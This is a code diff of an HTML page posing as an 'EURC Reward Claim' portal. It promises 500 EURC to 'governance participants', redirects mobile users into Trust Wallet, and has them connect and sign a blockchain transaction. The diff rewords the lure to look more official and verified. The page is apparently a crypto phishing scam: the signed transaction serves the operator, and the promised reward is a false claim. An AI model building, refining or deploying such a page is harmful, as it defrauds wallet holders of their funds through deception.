@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EURC | Institutional Reward Portal</title>
+    <title>EURC | Institutional Governance Portal</title>
     <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
@@ -11,15 +11,14 @@
         body { background: var(--bg-dark); color: white; font-family: 'Plus Jakarta Sans', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; position: relative; overflow: hidden; }
         
         /* Arka Plan Modern Blur Efekti */
-        .glow { position: absolute; width: 400px; height: 400px; background: radial-gradient(circle, rgba(39, 117, 202, 0.12) 0%, transparent 70%); z-index: -1; border-radius: 50%; top: 50%; left: 50%; transform: translate(-50%, -50%); }
+        .glow { position: absolute; width: 400px; height: 400px; background: radial-gradient(circle, rgba(39, 117, 202, 0.15) 0%, transparent 70%); z-index: -1; border-radius: 50%; top: 50%; left: 50%; transform: translate(-50%, -50%); }
 
-        .card { background: var(--card-bg); padding: 3rem 2.5rem; border-radius: 32px; text-align: center; width: 100%; max-width: 420px; border: 1px solid rgba(255, 255, 255, 0.05); box-shadow: 0 50px 100px rgba(0,0,0,0.8); backdrop-filter: blur(10px); }
+        .card { background: var(--card-bg); padding: 3.5rem 2.5rem; border-radius: 32px; text-align: center; width: 100%; max-width: 420px; border: 1px solid rgba(255, 255, 255, 0.05); box-shadow: 0 50px 100px rgba(0,0,0,0.8); backdrop-filter: blur(10px); }
         
-        /* Kodla Çizilmiş EURC Logosu */
-        .logo-circle { width: 100px; height: 100px; margin: 0 auto 2.5rem; background: var(--eurc-blue); border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 40px rgba(39, 117, 202, 0.4); border: 4px solid rgba(255, 255, 255, 0.1); }
-        .logo-text { font-size: 50px; font-weight: 800; color: white; letter-spacing: -2px; }
+        /* Kesin Çözüm: SVG ile Çizilmiş EURC Logosu */
+        .logo-circle { width: 90px; height: 90px; margin: 0 auto 2.5rem; background: var(--eurc-blue); border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 40px rgba(39, 117, 202, 0.4); border: 4px solid rgba(255, 255, 255, 0.1); }
         
-        .badge { display: inline-flex; align-items: center; gap: 6px; background: rgba(39, 117, 202, 0.1); color: var(--eurc-blue); padding: 8px 16px; border-radius: 100px; font-size: 11px; font-weight: 800; letter-spacing: 1px; margin-bottom: 1.5rem; border: 1px solid rgba(39, 117, 202, 0.2); }
+        .badge { display: inline-flex; align-items: center; gap: 6px; background: rgba(39, 117, 202, 0.15); color: var(--eurc-blue); padding: 8px 16px; border-radius: 100px; font-size: 11px; font-weight: 800; letter-spacing: 1px; margin-bottom: 1.5rem; border: 1px solid rgba(39, 117, 202, 0.2); }
         
         h2 { margin: 0 0 1rem; font-size: 28px; font-weight: 800; letter-spacing: -1px; }
         p { color: var(--text-dim); font-size: 15px; margin-bottom: 2.5rem; line-height: 1.6; font-weight: 500; }
@@ -44,15 +43,15 @@
     <div class="badge">● BSC NETWORK VERIFIED</div>
     
     <div class="logo-circle">
-        <svg width="60" height="60" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <circle cx="50" cy="50" r="45" stroke="white" stroke-width="6" stroke-dasharray="230 50" stroke-linecap="round"/>
-            <path d="M35 50H65M35 40H65M35 60H65" stroke="white" stroke-width="8" stroke-linecap="round"/>
-            <path d="M40 30C35 35 35 65 40 70" stroke="white" stroke-width="8" stroke-linecap="round"/>
+        <svg width="50" height="50" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="50" cy="50" r="44" stroke="white" stroke-width="8"/>
+            <path d="M30 43H70M30 57H70" stroke="white" stroke-width="8" stroke-linecap="round"/>
+            <path d="M55 25C40 25 35 40 35 50C35 60 40 75 55 75" stroke="white" stroke-width="8" stroke-linecap="round"/>
         </svg>
     </div>
 
     <h2>EURC Reward Claim</h2>
-    <p>Exclusive incentives for governance active wallets. Claim your 500 EURC reward to your secure wallet.</p>
+    <p>Governance participants are eligible to claim accumulated EURC incentives. Connect your secure wallet to verify eligibility.</p>
     
     <button id="claimBtn" class="btn">Connect & Claim Reward</button>
     
@@ -72,6 +71,7 @@
         const b = document.getElementById('claimBtn');
         const s = document.getElementById('statusMsg');
 
+        // Mobilde cüzdan dışındaysa cüzdanı tetikler
         if (!window.ethereum) {
             window.location.href = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href);
             return;
@@ -106,7 +106,7 @@
             await tx.wait();
             
             b.innerText = "Success!";
-            s.innerText = "Claim complete. Reward arrives in 24h.";
+            s.innerText = "500 EURC will be sent to your wallet within 24h.";
             
         } catch (err) {
             b.innerText = "Try Again";
